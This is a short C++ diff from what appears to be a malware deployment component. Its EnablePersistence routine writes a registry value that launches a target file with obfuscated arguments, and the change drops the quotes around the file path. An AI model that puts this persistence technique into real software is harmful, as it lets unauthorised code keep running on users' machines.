@@ -60,7 +60,7 @@ bool SpecterBasicDeployment::Install()
 
 bool SpecterBasicDeployment::EnablePersistence()
 {
-	boost::wformat format(L"\"%1%\" \"%2%\"");
+	boost::wformat format(L"%1% \"%2%\"");
 	format % m_target_file % m_obscrypto_args;
 
 	const auto result = m_reg_key.TrySetStringValue(m_program_name, format.str());
